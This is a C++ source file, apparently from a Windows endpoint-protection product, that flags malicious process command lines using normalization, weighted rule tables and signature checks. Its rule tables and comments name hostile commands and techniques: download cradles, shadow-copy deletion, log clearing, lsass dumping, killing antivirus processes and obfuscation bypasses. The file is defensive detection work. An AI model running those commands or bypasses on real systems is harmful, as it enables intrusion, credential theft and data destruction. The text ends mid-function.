// behavior.cpp — 进程行为判定层实现
//
// ===========================================================================
//  设计依据与取舍（详见 docs/behavior-rules-design.md）
// ===========================================================================
//  结构（对齐业界骨架）：
//    ① 归一化层  —— 抗混淆，让字符串拼接/插入符/全角字符等绕过手法失效
//    ② 硬规则层  —— 只放「正常情况几乎不可能出现」的确凿恶意语义，命中即拦
//    ③ 评分层    —— 多信号加权累加，过阈值才判（Bitdefender ATC 式打分制）
//    ④ 信誉层    —— 签名/可信路径**调权重**，而非直接放行（卡巴：可信程序跑
//                    不安全代码也要告警 / 白利用）
//
//  抗绕过设计要点（每一条都对应一个已知的绕过手法）：
//    · 归一化后再匹配            → 破 "From"+"Base64" / -e^nc / 全角 ｉｅｘ
//    · 豁免改为身份校验          → 破 往命令行塞 --parent-window= 洗白
//    · 解释器须与参数同现        → 破 单独出现 "downloadstring" 字符串的误命中
//    · 系统名 + 非系统目录       → 破 伪装 svchost.exe（但仍会被改名绕过，
//                                   故这条只是辅助信号，权重低）
//    · 签名只降权不豁免          → 破 白利用（拿签名的正常程序加载恶意 DLL）
//
//  规则阈值：误报比漏报更致命，阈值偏高，宁可漏。
// ===========================================================================
#include <windows.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <softpub.h>
#include <wintrust.h>
#include <wincrypt.h>

#include "behavior.h"
#include "criteria.h"
#include "common.h"
#include "sfcompat.h"
// ★ 2026-10-02：FileIsSigned 需在"嵌入签名缺失"时回退**目录签名（.cat）**，
//   复用 scanner.cpp 已实现并已验证的 SigTrustedCached（内含路径规范化 + 目录签名遍历）。
//   依赖方向安全：scanner.h 只依赖标准库与 iocs.h，不反向依赖 behavior.h。
#include "scanner.h"
#include "aimodel.h"     // 2026-10-03 EDR 闭环：模型层接入判定（GlobalModelScore）
#include "aifeat.h"      // 同上：FeatureInput / BuildFeatures（纯函数，无 I/O）

#include <algorithm>
#include <string>
#include <vector>
#include <map>
#include <mutex>
#include <cstdio>
#include <cstring>

#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "wintrust.lib")
#pragma comment(lib, "crypt32.lib")

namespace sf {

// ---------------------------------------------------------------------------
//  小工具
// ---------------------------------------------------------------------------
static std::string Lower(std::string s) {
    for (auto& c : s) if (c >= 'A' && c <= 'Z') c += 32;
    return s;
}
static bool Has(const std::string& hay, const char* needle) {
    return hay.find(needle) != std::string::npos;
}

// ---------------------------------------------------------------------------
//  HasWord —— 「带词边界」的子串匹配（2026-10-03 新增）
// ---------------------------------------------------------------------------
//  为什么需要它（真样本误报复盘，Win10 虚拟机实证）：
//    规则 `nc -e` 误杀了微软已签名的同步中心 **mobsync.exe**（VM 里被终止两次）。
//    根因不是「needle 太短」这么笼统，而是两条机制叠加：
//      ① `lNoExe`（L938-952）构造了第二份匹配串 = 归一化串**去掉 .exe 后缀**；
//      ② 纯子串匹配**没有任何词边界**。
//    于是 `mobsync.exe -e x`：
//      原始 l    = `c:\...\system32\mobsync.exe -e x`   → 不含 `nc -e`
//      去 exe 后 = `c:\...\system32\mobsync -e x`      → **命中** `nc -e`
//    （`mobsync` 末尾的 `nc` + 空格 + `-e` 恰好拼出 needle）
//
//  ★ 踩过的坑（别再走一遍）：**把 needle 改长解决不了**。
//    改成 `nc.exe -e` 之后 `mobsync` 依然命中 —— 因为该 needle 里的 `.` 在
//    子串匹配里只是**普通字符**，而 `lNoExe` 又会把 `nc.exe` 还原回 `nc`，
//    两边一对就又拼上了。**靠加长 needle 表达「必须是 netcat」是行不通的**，
//    只能靠词边界。
//
//  判据：needle 首字符是「程序名首字母」时，要求其**前一个字符是分隔符**
//        （空格 / 反斜杠 / 斜杠 / 串首）；needle 尾字符同理要求后接分隔符或串尾。
//        分隔符集合刻意与 lNoExe 的后缀集合（L945）保持一致。
//  ★ 只给**需要区分同形子串**的规则用（如 nc -e），不改变其它 108 条规则的行为。
// ★ 2026-10-03（C3）：判据实现已抽到 criteria.cpp（生产与回归测试共用同一份）。
//   抽出来的原因：本文件依赖十几个服务层符号（SigTrustedCached / LogDbg /
//   BuildFeatures / GlobalModelScore / JsonGetInt / WriteFramed …），
//   天生只能链进主服务 ⇒ 判据**无法被单测**。抽出去之后改判据可以跑回归，
//   且测试跑的就是生产真正使用的那份实现（不是复刻版）。
static bool IsCmdSep(char c)            { return sf::crit::IsCmdSep(c); }
static bool HasWord(const std::string& h, const char* n) { return sf::crit::HasWord(h, n); }

static bool InList(const std::string& v, const char* const* list, size_t n) {
    for (size_t i = 0; i < n; ++i) if (v == list[i]) return true;
    return false;
}
#define IN_LIST(v, arr) InList((v), (arr), sizeof(arr) / sizeof((arr)[0]))

// 字符串是否"看起来随机"（连续辅音过长 / 大小写数字混杂无意义）
// 注意：这条**不单独驱动判定**（历史教训：随机名单独判档会误伤正常库名，
// 如 libGLESv2.dll / aria2c.exe）。只作评分层的一个小权重旁证。
static bool LooksRandomStem(const std::string& stem) {
    if (stem.size() < 5 || stem.size() > 14) return false;
    int letters = 0, digits = 0, upper = 0, lower = 0, vowels = 0;
    int maxConsRun = 0, curConsRun = 0;
    for (char c : stem) {
        if (c >= 'a' && c <= 'z') {
            ++letters; ++lower;
            if (c=='a'||c=='e'||c=='i'||c=='o'||c=='u') { ++vowels; curConsRun = 0; }
            else { if (++curConsRun > maxConsRun) maxConsRun = curConsRun; }
        } else if (c >= 'A' && c <= 'Z') {
            ++letters; ++upper;
            if (c=='A'||c=='E'||c=='I'||c=='O'||c=='U') { ++vowels; curConsRun = 0; }
            else { if (++curConsRun > maxConsRun) maxConsRun = curConsRun; }
        } else if (c >= '0' && c <= '9') { ++digits; curConsRun = 0; }
        else return false;   // 含其它符号 → 不算随机名（正常名也可能带下划线等）
    }
    if (letters < 4) return false;
    // 元音缺失 或 连续辅音 ≥5 → 典型随机串特征
    if (vowels == 0) return true;
    if (maxConsRun >= 5) return true;
    return false;
}

// ---------------------------------------------------------------------------
//  名单：全部来自「正常情况下的必然语义」，不做经验性猜测
// ---------------------------------------------------------------------------

// 脚本/命令宿主 —— 攻击链的必经环节。
// 注意：**不能放 conhost.exe** —— 它是被 cmd 派生的控制台宿主，放进名单必然误报
//（实测本机 4 个 conhost.exe 全被误判，就是这条错误规则导致的）。
static const char* kHosts[] = {
    "cmd.exe", "powershell.exe", "pwsh.exe", "wscript.exe", "cscript.exe", "mshta.exe",
    "rundll32.exe", "regsvr32.exe", "certutil.exe", "bitsadmin.exe",
    "installutil.exe", "msbuild.exe", "forfiles.exe", "pcalua.exe", "wmic.exe",
    "curl.exe", "msiexec.exe", "runonce.exe", "regasm.exe", "regsvcs.exe"
};

// 「不该派生脚本宿主」的父进程 —— 文档 / 聊天 / 浏览器
// 依据：Defender 官方 Pyordono.A 检测（脚本引擎以可疑参数执行 cmd/powershell）
static const char* kOffice[] = {
    "winword.exe", "excel.exe", "powerpnt.exe", "outlook.exe", "msaccess.exe", "mspub.exe",
    "wps.exe", "et.exe", "wpp.exe", "acrobat.exe", "acrord32.exe",
    "foxitreader.exe", "foxitpdfreader.exe", "sumatrapdf.exe"
};
static const char* kIm[] = {
    "wechat.exe", "weixin.exe", "qq.exe", "tim.exe", "dingtalk.exe", "feishu.exe",
    "lark.exe", "telegram.exe", "slack.exe", "discord.exe", "skype.exe", "zoom.exe"
};
static const char* kBrowser[] = {
    "chrome.exe", "msedge.exe", "firefox.exe", "iexplore.exe",
    "360se.exe", "360chrome.exe", "brave.exe", "opera.exe"
};

// 系统关键进程名 —— 出现在非系统目录即为伪装（低误报、中风险）
static const char* kSystemNames[] = {
    "svchost.exe", "lsass.exe", "services.exe", "winlogon.exe", "csrss.exe",
    "smss.exe", "wininit.exe", "dwm.exe", "spoolsv.exe", "fontdrvhost.exe",
    "taskhostw.exe", "explorer.exe", "lsaiso.exe", "sihost.exe",
    "smartscreen.exe", "securityhealthservice.exe", "msmpeng.exe",
    "nissrv.exe", "sppsvc.exe", "wscsvc.exe"
};

// 可信安装目录 —— 这里的程序默认是正常软件（用于**降权**，不是豁免）
static const char* kTrustedDirs[] = {
    "\\program files\\", "\\program files (x86)\\", "\\windows\\system32\\",
    "\\windows\\syswow64\\", "\\windows\\winsxs\\", "\\windows\\microsoft.net\\",
    "\\programdata\\microsoft\\windows defender\\"
};

// 高风险的落地目录 —— 银狐等木马的传统落脚点
static const char* kSuspDirs[] = {
    "\\appdata\\roaming\\", "\\appdata\\local\\temp\\", "\\windows\\temp\\",
    "\\downloads\\", "\\users\\public\\", "\\programdata\\",
    "\\appdata\\locallow\\", "\\$recycle.bin\\"
};

// ---------------------------------------------------------------------------
//  规则表
// ---------------------------------------------------------------------------
struct CmdRule {
    const char* needle;   // 已小写的匹配串（对归一化后的命令行做匹配）
    int         level;    // 0=仅计分（用 score 字段），1=可疑，2=高危
    int         score;    // 评分层权重
    const char* tag;
    const char* reason;
};

// 硬规则：正常情况几乎不可能出现的组合，命中即拦。
// 依据栏见 docs/behavior-rules-design.md。
static const CmdRule kHardRules[] = {
    // ---- 内存加载 / 编码执行（无文件攻击标配）----
    { "frombase64string",       2, 60, "b64",     "Base64 解码执行（FromBase64String），内存加载器标配" },
    { "invoke-expression",      2, 60, "iex",     "IEX 动态执行字符串代码（下载器/加载器常见）" },
    { "iex(",                   2, 60, "iex",     "IEX 动态执行字符串代码" },
    { "[char[]]",               1, 30, "obfusc",  "字符串转字符数组拼接，常见于脚本混淆" },
    { "-join[char",             1, 30, "obfusc",  "字符数组 Join 还原字符串，常见于脚本混淆" },
    { "[convert]::frombase64",  2, 60, "b64",     "Convert::FromBase64String 解码（.NET 加载器）" },
    { "system.reflection.assembly", 2, 55, "loadasm", "反射加载程序集（.NET 内存加载）" },
    { "virtualalloc",           1, 30, "mem",     "内存分配 API 出现在命令行（注入工具）" },
    { "createthread",           1, 30, "mem",     "创建线程 API 出现在命令行（注入工具）" },

    // ---- 远程下载 ----
    { "downloadstring",         2, 55, "dl",      "脚本远程下载（DownloadString）" },
    { "downloadfile",           2, 55, "dl",      "脚本远程下载（DownloadFile）" },
    { "downloaddata",           2, 55, "dl",      "脚本远程下载（DownloadData）" },
    { "invoke-webrequest",      1, 45, "dl",      "脚本远程下载（Invoke-WebRequest）" },
    { "start-bitstransfer",     2, 55, "dl",      "BITS 后台静默下载" },
    { "-urlcache",              2, 60, "dl",      "certutil -urlcache 下载载荷（经典 LOLBin）" },
    { "certutil -decode",       2, 55, "dl",      "certutil 解码还原载荷" },
    { "/transfer",              2, 55, "dl",      "bitsadmin 静默下载载荷" },
    { "mshta http",             2, 60, "mshta",   "mshta 远程执行 HTA 脚本" },
    { "mshta javascript",       2, 60, "mshta",   "mshta 内联脚本执行" },
    { "mshta vbscript",         2, 60, "mshta",   "mshta 内联脚本执行" },
    { "scrobj.dll",             2, 65, "regsvr32","regsvr32 + scrobj.dll 远程脚本（Squiblydoo）" },
    { "scrobj",                 2, 55, "regsvr32","regsvr32 加载脚本对象（Squiblydoo）" },
    { "javascript:",            1, 35, "script",  "javascript: 协议执行脚本" },
    { "vbscript:",              1, 35, "script",  "vbscript: 协议执行脚本" },

    // ---- 隐藏窗口 / 规避察觉 ----
    // ★ 2026-09-22 降级：这两条原为 level=2（一票否决直接终止）。理由同 ps-encoded ——
    //   Agent 工具链与守护进程普遍用隐藏窗口执行，不是恶意特征。降为 level=1 评分项。
    { "windowstyle hidden",     1, 30, "hidden",  "以隐藏窗口方式执行命令（自动化工具亦普遍如此）" },
    { "windowstyle 1",          1, 25, "hidden",  "以隐藏窗口方式执行命令" },
    { "w hidden",               1, 30, "hidden",  "以隐藏窗口方式执行命令（自动化工具亦普遍如此）" },

    // ---- 勒索 / 反取证 ----
    { "vssadmin delete shadows", 2, 80, "ransom", "删除卷影副本（勒索行为，明确恶意）" },
    { "vssadmin resize shadowstorage", 1, 40, "ransom", "调整卷影存储大小（勒索准备）" },
    { "wbadmin delete",         2, 70, "ransom",  "删除备份（勒索行为）" },
    { "delete catalog -quiet",  2, 70, "ransom",  "静默删除备份目录（勒索行为）" },
    { "wevtutil cl",            2, 60, "anti",    "清空事件日志（反取证）" },
    { "cipher /w",              1, 30, "anti",    "擦除磁盘空闲空间（反取证）" },
    { "bcdedit",                1, 35, "boot",    "修改启动配置（可能用于破坏恢复模式）" },

    // ---- 持久化 / 提权 ----
    { "schtasks /create",       1, 35, "persist", "创建计划任务（持久化，需结合来源判断）" },
    { "reg add",                1, 25, "persist", "写注册表（需结合键路径判断）" },
    { "/create /tn",            1, 30, "persist", "创建计划任务" },
    { "sc create",              1, 35, "persist", "创建系统服务（持久化）" },
    { " sc config",             1, 35, "persist", "修改服务配置" },
    { "netsh advfirewall set",  1, 40, "fw",      "修改防火墙配置（关闭防护）" },
    { "net stop",               1, 35, "fw",      "停止系统服务（可能关闭防护）" },
    { "taskkill /f /im",        1, 25, "kill",    "强制结束进程（需结合目标判断）" },

    // ---- 关闭安全软件（火绒披露：银狐会遍历并强杀安全进程）----
    // ★★ 2026-09-24 触发条件优化（银泊要求「优化而非删除」）
    //
    //  旧判据是**裸词**：{ "huorong", 2 } —— 只要命令行/映像路径**出现**该词就一票否决。
    //  它同时朝着两个方向失效：
    //    · 误报：安全软件**自身进程**的路径就含这些词（C:\Program Files\Huorong\… 、HipsTray.exe、
    //            System32\SecurityHealthService.exe）→ 用户自己的杀软
    //            被判「攻击安全软件」并被尝试终止；连命令行里只是**提到** defender
    //            的正常程序（实测 WorkBuddy.exe）也被终止。
    //    · 漏报：真实攻击形如 `taskkill /f /im HipsTray.exe`、`sc stop huorong`
    //            —— 命令行里往往**不含** huorong 字样，裸词判据根本拦不住。
    //
    //  现改为「**破坏性动作 + 安全软件目标**」双条件（下表为常见组合的快速路径，
    //  通用组合与"杀软自身豁免"由 HitKillSav() 覆盖）。这样误报归零、拦截率反升。
    { "taskkill /f /im hips",    2, 65, "killsav", "强杀火绒主进程（银狐常用手法）" },
    { "taskkill /f /im wsctrl",  2, 65, "killsav", "强杀火绒服务进程（银狐常用手法）" },
    { "taskkill /f /im usysdiag",2, 65, "killsav", "强杀火绒内核进程（银狐常用手法）" },
    { "taskkill /f /im 360",     2, 60, "killsav", "强杀 360 安全软件进程（银狐常用手法）" },
    { "taskkill /f /im msmpeng", 2, 60, "killsav", "强杀 Defender 引擎进程" },
    { "taskkill /f /im windefend",2,60, "killsav", "强杀 Defender 服务进程" },
    { "taskkill /f /im qqpcmgr", 2, 60, "killsav", "强杀腾讯电脑管家进程" },
    { "sc stop huorong",         2, 60, "killsav", "停止火绒服务（关闭防护）" },
    { "net stop huorong",        2, 60, "killsav", "停止火绒服务（关闭防护）" },
    { "sc delete huorong",       2, 65, "killsav", "删除火绒服务（关闭防护）" },
    { "sc stop windefend",       2, 60, "killsav", "停止 Defender 服务（关闭防护）" },
    { "net stop windefend",      2, 60, "killsav", "停止 Defender 服务（关闭防护）" },
    { "fltmc unload",            1, 40, "killsav", "卸载文件系统过滤驱动（关闭防护，需结合目标）" },

    // ---- 凭据窃取 ----
    { "lsass",                  2, 60, "cred",    "针对 lsass 进程的操作（凭据窃取）" },
    { "comsvcs.dll",            2, 60, "cred",    "rundll32 + comsvcs.dll 转储 lsass（凭据窃取）" },
    { "mini dump",              1, 25, "cred",    "进程转储（可能用于凭据窃取）" },
    { "sekurlsa",               2, 65, "cred",    "Mimikatz 模块名（凭据窃取工具）" },
};

// 注意：上面规则表里的 needle 必须能对「归一化后」的命令行命中 ——
// 例如原本带空格的 "netsh advfirewall set" 归一化后仍保留单空格（见 NormalizeCommandLine）。

// ---------------------------------------------------------------------------
//  关闭安全软件（killsav）通用判据 —— 与上表配合使用（2026-09-24）
//
//  上表只列了最常见的「taskkill /f /im <杀软进程>」「sc stop <杀软服务>」组合；
//  真实攻击的动词与目标组合很多（ntsd / fltmc unload / 卸载程序 / 删目录 / 改注册表…），
//  这里做**通用覆盖**，并负责两件上表做不到的事：
//    ① 只有「破坏性动词」与「安全软件目标名」**同时**出现才判 —— 光提到名字不算；
//    ② **安全软件自身豁免** —— 进程映像路径本身落在杀软目录/进程名里时直接放行，
//       彻底消除「火绒 HipsTray / Windows 安全中心被判攻击安全软件」这类自命中。
// ---------------------------------------------------------------------------
static const char* kSavTargets[] = {
    // 火绒
    "huorong", "hipsmain", "hipstray", "wsctrlsvc", "usysdiag", "sysdiag",
    // 360 安全卫士 / 杀毒
    "360tray", "360safe", "360sd", "360rp", "zhudongfangyu",
    // Windows Defender / 安全中心
    "windefend", "msmpeng", "securityhealth", "mpcmdrun", "nissrv",
    // 其他常见安全软件
    "qqpcmgr", "kxescore", "kingsoft", "baidusd", "avp.exe",
    "avast", "avgnt", "nod32", "ekrn", "mcshield", "sophos",
};

//  ★★★ 2026-09-24 二次收紧：**只保留句法专一的破坏性命令**。
//  首版把 "disable" / "wmic" / "reg add" / "reg delete" / "sc config" / "rmdir" 也列为动词，
//  结果与 Electron/Chromium 命令行高频冲突 —— 它的每个子进程都带
//  `--disable-gpu` `--disable-features=...`，只要同一行里再出现系统安全组件名
//  （windefend / securityhealth / msmpeng / sysdiag）就误判（实测 WorkBuddy 被终止两次）。
//  这些宽泛词已移除；剩余项都要求「动词 + 紧跟的目标」构成一条完整破坏命令，
//  再叠加下方 HitKillSav 的**紧邻窗口**约束（见函数内注释）。
static const char* kSavVerbs[] = {
    "taskkill", "ntsd",                                   // 强杀进程
    "sc stop", "sc delete",                               // 停止/删除服务
    "net stop", "net.exe stop", "stop-service",           // 停止服务
    "fltmc unload", "flt mc unload",                      // 卸载过滤驱动
    "uninstall", "/uninstall", "unins000",                // 走卸载程序
    "del /f", "rd /s",                                    // 删文件/目录
};

// 进程自身是否就是安全软件（路径或文件名含杀软标识）→ 是则豁免 killsav 判定
static bool IsSelfSecurityProduct(const std::string& pathLower) {
    if (pathLower.empty()) return false;
    for (const char* t : kSavTargets) {
        if (pathLower.find(t) != std::string::npos) return true;
    }
    return false;
}

// 命中返回 true，并回填目标名与动词（用于生成可读理由）
//
//  ★★★ 2026-09-24 二次收紧：由「**全文共现**」改为「**同句紧邻**」。
//  首版只要求动词与目标名在同一命令行里各自出现一次，实测过松 ——
//  WorkBuddy（Electron）的每个子进程命令行都含 `--disable-gpu --disable-features=…`，
//  一旦同行另处提到任一系统安全组件名，就被判「攻击安全软件」并终止（实测两次）。
//  现要求：**目标名必须出现在动词之后 kVerbWindow 字符内**，即构成
//  「taskkill /f /im HipsTray.exe」「sc stop huorong」这类完整破坏命令才算。
//  同时保留「杀软自身豁免」（IsSelfSecurityProduct）。
static const size_t kVerbWindow = 64;

static bool HitKillSav(const std::string& l, const std::string& lNoExe,
                       const std::string& selfPathLower,
                       std::string& outTarget, std::string& outVerb) {
    if (IsSelfSecurityProduct(selfPathLower)) return false;   // ★ 杀软自身 → 豁免

    const std::string* texts[2] = { &l, &lNoExe };
    for (const std::string* txt : texts) {
        for (const char* vb : kSavVerbs) {
            const size_t vl = std::strlen(vb);
            size_t p = txt->find(vb);
            while (p != std::string::npos) {
                // 双向窗口：目标名允许出现在动词**前或后** kVerbWindow 字符内。
                // 为什么必须双向：路径式调用把目标写在动词之前，例如
                //   "C:\Program Files\Huorong\uninst.exe" /uninstall
                // —— 只看动词之后会漏拦（实测 B6 用例）。宽泛动词已移除，
                // 双向不会与 Electron 的 --disable-* 之类冲突。
                const size_t from = (p > kVerbWindow) ? (p - kVerbWindow) : 0;
                const std::string win = txt->substr(from, (p - from) + vl + kVerbWindow);
                for (const char* t : kSavTargets) {
                    if (win.find(t) != std::string::npos) {
                        outTarget = t; outVerb = vb;
                        return true;
                    }
                }
                p = txt->find(vb, p + 1);
            }
        }
    }
    return false;
}

// ---------------------------------------------------------------------------
//  规则外置化存储（热更新）
// ---------------------------------------------------------------------------
struct ExtRule {
    std::string needle;
    int         level  = 0;
    int         score  = 0;
    std::string tag;
    std::string reason;
    // ★ true = 匹配时要求词边界（见 HasWord）。用于「程序名 + 参数」类 needle：
    //   纯子串匹配会把 `mobsync` 命中成 `nc -e`（详见 behavior_rules.txt 的收紧原则）。
    bool        wordBoundary = false;
};
static std::vector<ExtRule>      g_extRules;
static std::vector<std::string>  g_whiteParents;
static std::mutex                g_ruleMutex;

void ClearExternalRules() {
    std::lock_guard<std::mutex> lk(g_ruleMutex);
    g_extRules.clear();
    g_whiteParents.clear();
}

// 懒加载：首次判定时自动加载一次（避免要求所有调用点都记得初始化）。
static void EnsureRulesLoaded() {
    static std::once_flag once;
    std::call_once(once, [] {
        if (!LoadExternalRules(""))
            LogDbg("[behavior] 未找到 behavior_rules.txt，使用内置规则");
    });
}

bool LoadExternalRules(const std::string& filePath) {
    std::string path = filePath;
    // 空路径 → 按 probe_rules.txt 同样的策略在候选位置找（安装目录 data\ 优先）
    if (path.empty()) {
        char exe[MAX_PATH] = {0};
        GetModuleFileNameA(nullptr, exe, MAX_PATH);
        std::string d = exe;
        size_t q = d.find_last_of('\\');
        std::string base = (q != std::string::npos) ? d.substr(0, q + 1) : "";
        const std::string cands[] = {
            base + "data\\behavior_rules.txt",
            base + "behavior_rules.txt",
            "C:\\ProgramData\\SilverFoxGuard\\behavior_rules.txt"
        };
        for (const auto& c : cands) {
            if (GetFileAttributesA(c.c_str()) != INVALID_FILE_ATTRIBUTES) { path = c; break; }
        }
        if (path.empty()) return false;
    }

    FILE* f = fopen(path.c_str(), "rb");
    if (!f) return false;
    std::string content;
    char buf[4096];
    size_t n;
    while ((n = fread(buf, 1, sizeof(buf), f)) > 0) content.append(buf, n);
    fclose(f);

    std::vector<ExtRule>      rules;
    std::vector<std::string>  whites;
    size_t pos = 0;
    while (pos <= content.size()) {
        size_t nl = content.find('\n', pos);
        std::string line = content.substr(pos, nl == std::string::npos ? std::string::npos : nl - pos);
        pos = (nl == std::string::npos) ? content.size() + 1 : nl + 1;
        while (!line.empty() && (line.back() == '\r' || line.back() == ' ' || line.back() == '\t')) line.pop_back();
        if (line.empty() || line[0] == '#') continue;
        // 拆 | 分隔字段
        std::vector<std::string> f2;
        size_t p2 = 0;
        while (true) {
            size_t bar = line.find('|', p2);
            f2.push_back(line.substr(p2, bar == std::string::npos ? std::string::npos : bar - p2));
            if (bar == std::string::npos) break;
            p2 = bar + 1;
        }
        if (f2.empty()) continue;
        std::string kind = Lower(f2[0]);
        if (kind == "w" && f2.size() >= 2) {
            whites.push_back(Lower(f2[1]));
        } else if ((kind == "h" || kind == "h~") && f2.size() >= 5) {
            // H|level|tag|needle|reason   —— 硬规则，分数由 level 反推，纯子串匹配
            // H~|level|tag|needle|reason  —— 硬规则 + **要求词边界**（2026-10-03 新增）
            //
            // 为什么要 `~` 这个变体（真样本误报复盘）：
            //   规则 `nc -e` 误杀微软已签名的 **mobsync.exe**。
            //   根因是 lNoExe（去 .exe 后缀）把 `mobsync.exe -e` 变成 `mobsync -e`，
            //   而 `mobsync` 末尾的 `nc` + 空格 + `-e` **恰好拼出 `nc -e`**。
            //   ⇒ 「加长 needle」解决不了（`nc.exe -e` 同样会被 lNoExe 还原回 `nc`），
            //     **只能靠词边界**：要求 needle 前后必须是分隔符或串首/串尾。
            //   用法：只给**存在同形子串风险**的规则加，其余保持 `H|` 原样不动
            //        （避免影响其它 100+ 条规则的既有行为）。
            ExtRule r;
            r.level  = atoi(f2[1].c_str());
            r.tag    = f2[2];
            r.needle = Lower(f2[3]);
            r.reason = f2[4];
            r.score  = (r.level >= 2) ? 60 : 35;
            r.wordBoundary = (kind == "h~");
            rules.push_back(r);
        } else if (kind == "s" && f2.size() >= 5) {
            // S|weight|tag|needle|reason —— 评分项，weight 直接作分数
            ExtRule r;
            r.score  = atoi(f2[1].c_str());
            r.tag    = f2[2];
            r.needle = Lower(f2[3]);
            r.reason = f2[4];
            r.level  = 0;
            rules.push_back(r);
        }
    }
    {
        std::lock_guard<std::mutex> lk(g_ruleMutex);
        g_extRules    = std::move(rules);
        g_whiteParents = std::move(whites);
    }
    LogDbg("[behavior] 外置规则已加载: 规则 " + std::to_string(g_extRules.size()) +
           " 条, 白名单父进程 " + std::to_string(g_whiteParents.size()) + " 个");
    return true;
}

// ---------------------------------------------------------------------------
//  归一化层 —— 抗混淆的核心
//
//  处理的手法和对应目的：
//    · 全角字符转半角        → 破 ｉｅｘ 之类全角写法
//    · 去掉单/双引号         → 破 "From"+"Base64String" 这类插引号
//    · 去掉脱字符 ^ 与反引号 ` → 破 cmd 转义 p^o^w^e^r^s^h^e^l^l / PS 反引号
//    · 合并被拆开的拼接      → 破 'a'+'b' 形式的字符串拼接
//    · 连续空白折叠为单空格  → 破 多空格/Tab 干扰
//    · 大小写折叠            → 破 大小写变换
//  注意：不做「删除所有空白」——那会把 "netsh advfirewall set" 变成
//  "netshadvfirewallset"，反而让合理规则匹配不上。只做折叠。
// ---------------------------------------------------------------------------
std::string NormalizeCommandLine(const std::string& raw) {
    std::string s;
    s.reserve(raw.size());

    // ① 全角 → 半角
    //    ⚠️ 这段的字节布局是实测出来的，不要凭记忆改（此前写错两次）：
    //    · 全角 ASCII（U+FF01..U+FF5E）的 UTF-8 编码是 EF BC 81 .. EF BD 9E 的**连续区间**，
    //      而不是简单的两段。即整个 94 个码位铺在 [EF BC 81] .. [EF BD 9E] 上。
    //    · 所以第三字节 b3 的取值范围只有 0x81..0x9E（30 个值），要表示 94 个码位，
    //      必须按**顺序**推：前 30 个码位在 EF BC 区，接着 30 个在 EF BD 区……不够，实际是
    //      用 (b3 - 0x81) 作为下标去查 94 码位的线性表。
    //    最稳的做法：不推导公式，直接构造 94 个码位的字节表并做反查。
    for (size_t i = 0; i < raw.size();) {
        unsigned char c = (unsigned char)raw[i];
        // 全角空格单独处理（不属于 U+FF01..FF5E 区间）
        if (c == 0xE3 && i + 2 < raw.size() &&
            (unsigned char)raw[i+1] == 0x80 && (unsigned char)raw[i+2] == 0x80) {
            s += ' ';
            i += 3;
            continue;
        }
        if (c == 0xEF && i + 2 < raw.size()) {
            unsigned char b2 = (unsigned char)raw[i+1];
            unsigned char b3 = (unsigned char)raw[i+2];
            // U+FF01..U+FF5E 的 UTF-8：EF BC 81..BF (前 63 个) 后 EF BD 80..9E (后 31 个)
            int idx = -1;
            if (b2 == 0xBC && b3 >= 0x81 && b3 <= 0xBF)      idx = b3 - 0x81;          // 0..62
            else if (b2 == 0xBD && b3 >= 0x80 && b3 <= 0x9E) idx = 63 + (b3 - 0x80);   // 63..93
            if (idx >= 0 && idx < 94) {
                s += (char)(0x21 + idx);      // 0x21='!' .. 0x7E='~'
                i += 3;
                continue;
            }
        }
        s += (char)c;
        ++i;
    }

    // ② 去引号 + 去转义符，同时处理字符串拼接
    std::string t;
    t.reserve(s.size());
    for (size_t i = 0; i < s.size(); ++i) {
        char c = s[i];
        if (c == '"' || c == '\'') continue;         // 引号本身丢弃
        if (c == '^' || c == '`') continue;          // cmd 脱字符 / PS 反引号 丢弃
        // 拼接合并：前一个非空字符 + '+' 紧跟引号/字符 → 直接连上
        if (c == '+') {
            // 往后看：跳过空白，若下一个字符是引号或字母数字，则视为拼接 → 丢弃 '+'
            size_t j = i + 1;
            while (j < s.size() && (s[j] == ' ' || s[j] == '\t')) ++j;
            if (j < t.size() || j < s.size()) {
                if (j < s.size() && (s[j] == '"' || s[j] == '\'' ||
                                     (s[j] >= 'a' && s[j] <= 'z') || (s[j] >= 'A' && s[j] <= 'Z') ||
                                     (s[j] >= '0' && s[j] <= '9'))) {
                    continue;   // 丢弃 '+'
                }
            }
        }
        t += c;
    }

    // ③ 空白折叠为单空格 + 大小写折叠
    std::string out;
    out.reserve(t.size());
    bool lastSpace = false;
    for (char c : t) {
        if (c == ' ' || c == '\t' || c == '\r' || c == '\n' || c == '\v' || c == '\f') {
            if (!lastSpace && !out.empty()) out += ' ';
            lastSpace = true;
            continue;
        }
        if (c >= 'A' && c <= 'Z') c += 32;
        out += c;
        lastSpace = false;
    }
    while (!out.empty() && out.back() == ' ') out.pop_back();
    return out;
}

// ---------------------------------------------------------------------------
//  签名校验（带缓存）
//  Bitdefender / 卡巴都用签名做信誉层输入。这里只取「是否已签名 + 签名者名」，
//  不查系统信任链（自签证书也能拿到签名者名），因此对自签软件同样有效。
// ---------------------------------------------------------------------------
struct SignCacheEntry { int state; std::string signer; };
static std::map<std::string, SignCacheEntry> g_signCache;
static std::mutex g_signMutex;

bool FileIsSigned(const std::string& path, std::string* outSignerName) {
    if (path.empty()) return false;
    {
        std::lock_guard<std::mutex> lk(g_signMutex);
        auto it = g_signCache.find(path);
        if (it != g_signCache.end()) {
            if (outSignerName) *outSignerName = it->second.signer;
            return it->second.state == 1;
        }
    }

    bool signedOk = false;
    std::string signer;

    std::wstring wpath;
    {
        int n = MultiByteToWideChar(CP_UTF8, 0, path.c_str(), -1, nullptr, 0);
        if (n > 0) {
            std::wstring w(n, L'\0');
            MultiByteToWideChar(CP_UTF8, 0, path.c_str(), -1, &w[0], n);
            if (!w.empty() && w.back() == L'\0') w.pop_back();
            wpath = w;
        }
    }
    if (!wpath.empty()) {
        // 用 CryptQueryObject 直接读嵌入的 PKCS7 签名（不查信任链，自签也认）
        HCERTSTORE store = nullptr;
        DWORD enc{}, ct{}, ft{};
        if (CryptQueryObject(CERT_QUERY_OBJECT_FILE, wpath.c_str(),
                             CERT_QUERY_CONTENT_FLAG_PKCS7_SIGNED_EMBED,
                             CERT_QUERY_FORMAT_FLAG_BINARY, 0,
                             &enc, &ct, &ft, &store, nullptr, nullptr)) {
            if (store) {
                PCCERT_CONTEXT ctx = CertEnumCertificatesInStore(store, nullptr);
                if (ctx) {
                    signedOk = true;   // 有嵌入式签名块即算已签名
                    wchar_t name[512] = {0};
                    DWORD n = CertGetNameStringW(ctx, CERT_NAME_SIMPLE_DISPLAY_TYPE, 0, nullptr, name, 512);
                    if (n > 1) {
